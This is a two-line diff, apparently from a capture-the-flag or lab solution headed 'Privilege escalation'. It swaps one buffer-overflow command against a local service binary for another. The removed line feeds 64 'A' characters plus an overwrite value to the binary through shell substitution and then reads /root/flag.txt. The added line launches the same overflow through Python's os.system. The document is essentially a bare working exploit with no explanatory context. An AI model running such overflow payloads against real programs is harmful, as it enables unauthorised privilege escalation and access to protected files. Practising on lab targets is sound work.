@@ -1,2 +1,2 @@
 Privilege escalation
-/home/user/service $(python3 -c "print('A'*64 + '22222222')") ; cat /root/flag.txt
+python3 -c "import os; os.system('/home/user/service ' + 'A'*64 + '22222222')"
